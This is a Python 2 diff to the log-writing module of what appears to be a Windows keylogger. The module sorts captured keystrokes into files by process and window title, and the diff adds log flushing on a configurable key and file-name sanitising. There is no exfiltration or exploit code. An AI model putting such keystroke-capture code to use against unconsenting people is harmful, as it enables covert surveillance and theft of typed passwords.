@@ -2,6 +2,7 @@ import win32api, win32con, win32process
 import os, os.path
 import time
 import re
+import sys
 
 
 class LogWriter:
@@ -17,35 +18,39 @@ class LogWriter:
             if(detail.errno==17):  #if directory already exists, swallow the error
                 pass
             else:
-                print "OSError:", repr(detail)
+                print "OSError:", detail
         
         self.writeTarget = ""
 
     def OpenLogFile(self, event):
         
-        self.subDirName = self.GetProcessNameFromHwnd(event.Window)
-        self.subDirName = re.sub(r':?\\',r'__',self.subDirName)
+        subDirName = self.GetProcessNameFromHwnd(event.Window)
+        subDirName = re.sub(r':?\\',r'__',subDirName)
+        
+        WindowName = re.sub(r':?\\',r'__',str(event.WindowName))
         
         try:
-            os.makedirs(os.path.join(self.rootLogDir, self.subDirName), 0777)
+            os.makedirs(os.path.join(self.rootLogDir, subDirName), 0777)
         except OSError, detail:
             if(detail.errno==17):  #if directory already exists, swallow the error
                 pass
             else:
                 print "OSError:", detail
     
-        self.filename = time.strftime('%Y%m%d') + "_" + str(event.Window) + "_" + str(event.WindowName) + ".txt"
+        filename = time.strftime('%Y%m%d') + "_" + str(event.Window) + "_" + WindowName + ".txt"
 
         #we do this writetarget thing to make sure we dont keep opening and closing the log file when all inputs are going
         #into the same log file. so, when our new writetarget is the same as the previous one, we just write to the same 
         #already-opened file.
-        if self.writeTarget != os.path.join(self.rootLogDir, self.subDirName, self.filename): 
+        if self.writeTarget != os.path.join(self.rootLogDir, subDirName, filename): 
             if self.writeTarget != "":
+                if self.debug: print "flushing and closing old log"
+                self.log.flush()
                 self.log.close()
-            self.writeTarget = os.path.join(self.rootLogDir, self.subDirName, self.filename)
+            self.writeTarget = os.path.join(self.rootLogDir, subDirName, filename)
             if self.debug: print "writeTarget:",self.writeTarget
 
-            self.log = open(os.path.join(self.rootLogDir, self.subDirName, self.filename), 'a')
+            self.log = open(self.writeTarget, 'a')
 
     def WriteToLogFile(self, event, options):
         self.OpenLogFile(event)
@@ -76,6 +81,10 @@ class LogWriter:
         if event.Ascii == 27 and options.parseEscape == True:
             self.PrintStuff('[KeyName:' + event.Key + ']')
 
+        if event.Key == options.flushKey:
+            self.log.flush()
+
+
     def PrintStuff(self, stuff):
         if self.debug == False:
             self.log.write(stuff)
@@ -86,7 +95,7 @@ class LogWriter:
     def GetProcessNameFromHwnd(self, hwnd):
     
         threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
-        if self.debug: print "(threadid, processid)", threadpid, procpid
+        #if self.debug: print "(threadid, processid)", threadpid, procpid
         
         # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
         
@@ -105,7 +114,9 @@ if __name__ == '__main__':
     event.Window = 264854
     event.WindowName = "Untitled - Notepad"
     event.Ascii = 65
+    event.Key = 'A'
     options = Blank()
     options.parseBackspace = options.parseEscape = options.addLineFeed = options.debug = False
+    options.flushKey = 'F12'
     lw.WriteToLogFile(event, options)
     
